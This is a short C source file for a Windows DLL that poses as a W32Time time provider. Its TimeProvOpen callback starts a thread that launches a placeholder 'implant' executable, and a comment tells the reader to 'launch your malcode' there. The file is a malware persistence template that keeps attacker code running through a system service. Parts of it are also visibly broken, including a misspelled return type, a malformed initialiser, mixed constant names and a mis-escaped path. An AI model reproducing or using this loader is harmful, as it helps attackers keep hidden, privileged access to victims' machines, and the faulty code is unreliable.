#include <windows.h>
#include "timeprov.h"

TimeProvSysCallbacks sc;
// WCHAR ProviderName1[] = L"MyCompanyMyAppProvider1";
const TimeProvHandle htp = (TimeProvHandle)1;
TcpGetSamplesArgs Samples;
DWORD dwPollInterval;

void Go(void) {
	STARTUPINFO info=(sizeof(info));
	PROCESS_INFORMATION processInfo;

	CreateProcess(
			"C:\\path\to\\implant",
			"", NULL, NULL, TRUE, 0, NULL, NULL,
			&info, &processInfo);
}

HRESULT CALLBACK TimeProvOpen(WCHAR *wszName, TimeProvSysCallbacks *pSysCallback, TimeProvHandle *phTimeProv) {

	// launch your malcode is separate thread
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE) Go, 0, 0, 0);

	// Copy the system callback pointers to buffer
	CopyMemory(&sc, (LPVOID)pSysCallback, sizeof(TimeProvSysCallbacks));
	*phTimeProv = htp;

	return S_OK;
}

RESULT CALLBACK TimeProvCommand(TimeProvHandle hTimeProv, TimeProvCmd eCmd, PVOID pvArgs) {

	switch( eCmd ) {
		case TPC_GetSamples:
		// Return the Sample structure in pvArgs
			CopyMemory(pvArgs, &Samples, sizeof(TcpGetSamplesArgs));
			break;
		case TCP_PollIntervalChanged:
		// Retrieve the new value
			sc.pfnGetTimeSysInfo( TSI_PollInterval, &dwPollInterval );
			break;	
		case TCP_TimeJumped:
		// Discard samples saved in the Samples structure
			ZeroMemory(&Samples, sizeof(TcpGetSamplesArgs));
			break;
		case TCP_UpdateConfig:
		// Read the config info from the registry
			break;		
	}
	return S_OK;
}

HRESULT CALLBACK TimeProvClose(TimeProvHandle hTimeProv) {
	return S_OK;
}